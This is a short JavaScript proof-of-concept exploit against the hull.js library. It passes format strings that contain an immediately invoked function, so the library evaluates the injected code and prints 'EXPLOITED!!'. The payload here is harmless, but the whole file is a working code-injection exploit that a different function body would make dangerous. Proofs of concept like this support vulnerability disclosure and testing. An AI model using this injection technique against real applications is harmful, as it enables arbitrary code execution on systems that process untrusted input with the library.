const hull = require("hull.js");

const payload = [
  '[(()=>{ console.log("EXPLOITED!!"); return "x"; })()]',
  '["y"]'
];

const pointset = [ { x: 1, y: 2 } ];

hull(pointset, 20, payload);
